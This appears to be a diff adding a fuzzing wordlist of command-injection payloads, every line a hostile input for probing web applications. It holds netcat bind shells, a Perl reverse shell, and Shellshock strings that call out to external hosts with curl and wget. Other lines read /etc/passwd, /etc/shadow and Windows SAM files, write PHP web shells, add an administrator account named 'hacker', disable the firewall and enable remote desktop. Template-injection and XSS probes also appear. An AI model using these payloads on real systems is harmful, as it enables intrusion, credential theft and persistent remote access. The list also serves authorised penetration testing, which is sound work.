@@ -1,0 +1,491 @@
+route
+& ls -l /home/*
+a;/usr/bin/id|
+&& dir C:\
+| dir C:\Documents and Settings\*
+&& net user hacker Password1 /ADD
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"""
+ls -l /etc/
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+"""|/usr/bin/id|"""
+| id
+%0a id %0a
+%0a ping -i 30 127.0.0.1 %0a
+{${sleep(10)}}
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+&& net view
+& dir C:\
+nc -lvvp 4445 -e /bin/sh &
+; netstat -an
+\n
+; sleep 1
+uname -a
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+nc -lvvp 4444 -e /bin/sh
+' & whoami
+&
+which nc
+""" && whoami"
+& type %SYSTEMROOT%\repair\SAM
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php"
+; net view
+| netsh firewall set opmode disable
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3"""
+| sleep 10
+|id;
+&& type %SYSTEMROOT%\repair\SYSTEM
+ipconfig
+exec('pwd')
+{{4+8}}
+;echo '<script>alert(1)</script>'
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+;uname;
+| dir
+&& ls -l /tmp
+system('whoami')
+&& ls -laR /var/www
+;/usr/bin/id\n
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+"&& perl -e 'print ""X""x4096'"
+&& uname -a
+' && whoami
+| curl http://crowdshield.com/.testing/rce.txt
+; whoami
+; sleep 15
+%0Aid
+;id\n
+type C:\Windows\repair\SAM
+; net user hacker Password1 /ADD
+; sleep 10
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl"
+|| phpinfo()
+& phpinfo()
+&& pwd
+'; whoami
+| ls -l /var/www/*
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+| ls -l /
+| nc -lvvp 4444 -e /bin/sh|
+&&type C:\\boot.ini
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"""
+"test* & perl -e 'print ""X""x16096'"
+\n/usr/bin/id;
+& type C:\Windows\repair\SYSTEM
+cat /etc/hosts
+&& ls -l /var/www/*
+| ls -l /etc/
+`
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php"
+& ls -l /etc/
+\nid|
+"; perl -e 'print ""X""x16096'"
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+wget https://crowdshield.com/.testing/rce_vuln.txt
+a);id;
+; ls -l /
+netsh firewall set opmode disable
+which perl
+; dir
+a)|id
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"""
+system('whoami');
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+"test* | perl -e 'print ""X""x16096'"
+; netsh firewall set opmode disable
+; systeminfo
+& type %SYSTEMROOT%\repair\SYSTEM
+type C:\WINNT\repair\SAM
+netstat
+& ls -l /tmp
+%0Acat%20/etc/passwd
+; ls -l /var/www/*
+dir
+&& dir C:\Documents and Settings\*
+; ls -l /home/*
+system('curl https://crowdshield.com/.testing/rce_vuln.txt')
+'||/usr/bin/id|'
+ls -l /home/*
+dir C:\Documents and Settings\*
+& netstat -an
+; nc -lvvp 4444 -e /bin/sh;
+"& perl -e 'print ""X""x2048'"
+&& netstat -an
+netstat -an
+| ipconfig /all
+| type C:\WINNT\repair\SAM
+& ping -i 30 127.0.0.1 &
+||/usr/bin/id|
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php"
+"|| perl -e 'print ""X""x8096'"
+| net localgroup Administrators hacker /ADD
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"""
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php"
+& sleep 15
+; system('sleep 5');
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"""
+a|/usr/bin/id
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'"
+ipconfig /all
+exec('pwd');
+$(`dir`)
+{{person.secret}}
+nc -lvvp 4448 -e /bin/sh&
+; pwd
+\n/usr/bin/id|
+| dir C:\
+; type C:\Windows\repair\SYSTEM
+&& dir C:\Users
+; type C:\WINNT\repair\SAM
+"test*; perl -e 'print ""X""x16096'"
+'& ping -i 30 127.0.0.1 &'
+systeminfo
+' || whoami
+| type C:\Windows\repair\SAM
+&& phpinfo()
+sysinfo
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"""
+%20{${sleep(20)}}
+|| sleep 10
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+""""
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+& id
+system('cat config.php');
+&& ipconfig /all
+"perl -e 'print ""X""x4096'"
+"test* && perl -e 'print ""X""x16096'"
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+%22%0A/usr/bin/id%0A%22
+| ls -laR /etc
+"&& perl -e 'print ""X""x16096'"
+& net view
+`/usr/bin/id`
+"""|id|"""
+|| system('sleep 5');
+& whoami
+exec('whoami');
+{${phpinfo()}}
+"; perl -e 'print ""X""x8096'"
+"&& perl -e 'print ""X""x8096'"
+\nid;
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php"
+&&dir
+%0A/usr/bin/id%0A
+$;/usr/bin/id
+; ls -laR /etc
+& ls -l /
+;id|
+& sleep 5
+dir C:\
+;system('cat%20/etc/passwd')
+"perl -e 'print ""X""x1024'"
+& system('sleep 5');
+a;/usr/bin/id
+&& type C:\WINNT\repair\SAM
+;phpinfo()
+|id|
+; id
+; type %SYSTEMROOT%\repair\SYSTEM
+\n/usr/bin/id\n
+';id;'
+{${sleep(3)}}
+| whoami
+"; perl -e 'print ""X""x4096'"
+; dir C:\Documents and Settings\*
+%20{${sleep(3)}}
+| ls -l /home/*
+which curl
+which netcat
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php"
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1"""
+`id`
+system('cat /etc/passwd');
+system('sleep 5');
+&& ifconfig
+{${sleep(hexdec(dechex(20)))}}
+& ls -laR /etc
+\n/bin/ls -al\n
+| pwd
+|nid\n
+"|| perl -e 'print ""X""x4096'"
+() { :;}; echo vulnerable 10
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php"
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+a);/usr/bin/id
+|id
+&& system('sleep 5');
+| type %SYSTEMROOT%\repair\SYSTEM
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php"
+system('pwd')
+ifconfig
+sleep 5
+phpinfo()
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"""
+&& ls -l /etc/
+eval('whoami');
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+a);id
+| net view
+{{person.name}}
+type C:\WINNT\repair\SYSTEM
+& pwd
+%0a%0d
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt"
+; ls -l /etc/
+";{$_GET[""cmd""]}"
+;|/usr/bin/id|
+a;id;
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+"{{ get_user_file(""/etc/hosts"") }}"
+|
+& nc -lvvp 4444 -e /bin/sh&
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php"
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"""
+""" & whoami"
+; type C:\Windows\repair\SAM
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"""
+"& perl -e 'print ""X""x4096'"
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"""
+a;/usr/bin/id;
+'|/usr/bin/id|'
+`ping 127.0.0.1`
+nc -lvvp 4447 -e /bin/sh;
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1"
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"""
+& dir
+eval('whoami')
+\r\n
+"| perl -e 'print ""X""x4096'"
+sleep 10
+ls
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl"
+;phpinfo();//
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"""
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php"
+| type C:\Windows\repair\SYSTEM
+which python
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"""
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php"
+& type C:\WINNT\repair\SAM
+"perl -e 'print ""X""x16384'"
+"& perl -e 'print ""X""x16096'"
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"""
+"""; whoami"
+;system('/usr/bin/id')
+& sleep 10
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>"
+a)|id;
+; dir C:\
+which gcc
+a);/usr/bin/id;
+; ls -l /tmp
+{1} + {1}
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>"
+&&
+net user hacker Password1 /ADD
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+"<?php system(""cat /etc/passwd"");?>"
+{{4+4}}
+a|id|
+| uname -a
+"| perl -e 'print ""X""x16096'"
+"test* || perl -e 'print ""X""x16096'"
+| ls -l /tmp
+;
+ls -l /
+a;id
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+a;id\n
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+| type %SYSTEMROOT%\repair\SAM
+; uname -a
+"|| perl -e 'print ""X""x16096'"
+a|id
+\nid\n
+exec('ls')
+;id;
+& sysinfo
+& systeminfo
+type %SYSTEMROOT%\repair\SAM
+| sleep 5
+nc -lvvp 4446 -e /bin/sh|
+exec('sleep 5');
+curl https://crowdshield.com/.testing/rce_vuln.txt
+type C:\Windows\repair\SYSTEM
+"<!--#exec cmd=""/usr/bin/id;-->"
+&& type C:\Windows\repair\SYSTEM
+eval('sleep 5')
+eval('sleep 5');
+; ifconfig
+%0a
+&& dir
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+eval('pwd');
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+'|id|'
+"perl -e 'print ""X""x81920'"
+""";id;"""
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl"
+ls -l /tmp
+& dir C:\Documents and Settings\*
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+""" || whoami"
+sleep 1
+$(`cat /etc/passwd`)
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+"perl -e 'print ""X""x2048'"
+; type %SYSTEMROOT%\repair\SAM
+type %SYSTEMROOT%\repair\SYSTEM
+whoami
+$(`whoami`)
+| ls -laR /var/www
+| sleep 1
+eval('ls')
+| ifconfig
+| systeminfo
+&& sysinfo
+dir C:\Users
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+' whoami
+';phpinfo();//
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>"
+; ls -laR /var/www
+&& netsh firewall set opmode disable
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+phpinfo();
+&&id
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+;id
+system('sleep 5')
+test*; ls -lhtR /var/www/
+"; perl -e 'print ""X""x2048'"
+net localgroup Administrators hacker /ADD
+"perl -e 'print ""X""x8192'"
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"""
+/index.html|id|
+;echo%20'<script>alert(1)</script>'
+|/usr/bin/id|
+& net user hacker Password1 /ADD
+; ipconfig /all
+\r
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+ls -l /var/www/*
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+| sleep 15
+"{{ get_user_file(""/etc/passwd"") }}"
+"<?php system(""sleep 5"");?>"
+"""||/usr/bin/id|"""
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php"
+&& ls -l /home/*
+%20{${phpinfo()}}
+"<?php system(""sleep 10"");?>"
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>"
+system('cat C:\boot.ini');
+ls -lh /etc/
+&& sleep 15
+& net localgroup Administrators hacker /ADD
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->"
+| dir C:\Users
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+| system('sleep 5');
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+net view
+& netsh firewall set opmode disable
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php"
+exec('whoami')
+&& ls -laR /etc
+;netstat -a;
+; sleep 5
+"'"""
+& ipconfig /all
+& type C:\Windows\repair\SAM
+exec('sleep 5')
+$(`type C:\boot.ini`)
+:phpversion();
+| netstat -an
+& uname -a
+$(`ls`)
+%0Aid%0A
+& ifconfig
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"""
+&& type C:\Windows\repair\SAM
+; net localgroup Administrators hacker /ADD
+& sleep 1
+%27%0A/usr/bin/id%0A%27
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php"
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+%0A/usr/bin/id
+| sysinfo
+""" | whoami"
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl"
+|/usr/bin/id
+'\n/bin/ls -al\n'
+|usr/bin/id\n
+{${sleep(20)}}
+||
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}"
+|/bin/ls -al
+&& sleep 5
+& dir C:\Users
+&& net localgroup Administrators hacker /ADD
+system('ls')
+&& sleep 10
+&& nc -lvvp 4444 -e /bin/sh &
+&& whoami
+which wget
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+eval('pwd')
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+system('pwd');
+& wget http://crowdshield.com/.testing/rce.txt
+| wget http://crowdshield.com/.testing/rce.txt
+"${@print(""RCEVulnerable"")}"
+'
+"&& perl -e 'print ""X""x2048'"
+; sysinfo
+&& ls -l /
+||/usr/bin/id;
+a)|/usr/bin/id;
+& curl http://crowdshield.com/.testing/rce.txt
+"""\n/bin/ls -al\n"""
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->"
+;/usr/bin/id|
+""" whoami"
+;system('id')
+;${@print(md5(RCEVulnerable))};
+pwd
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+& ping -n 30 127.0.0.1 &
+| phpinfo()
+a)|/usr/bin/id
+&& sleep 1
+a);id|
+| net user hacker Password1 /ADD
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>"
+|| sleep 15
+; dir C:\Users
+&& type %SYSTEMROOT%\repair\SAM
+cat /etc/passwd
+a);/usr/bin/id|
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php"
+& ls -l /var/www/*
+&& systeminfo
+uname
+"""& ping -i 30 127.0.0.1 &"""
+*; ls -lhtR /var/www/
+"| perl -e 'print ""X""x8096'"
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl"
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"""
+"{{ get_user_file(""C:\boot.ini"") }}"
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+"""'"
+a;id|
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6"""
+& ls -laR /var/www
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX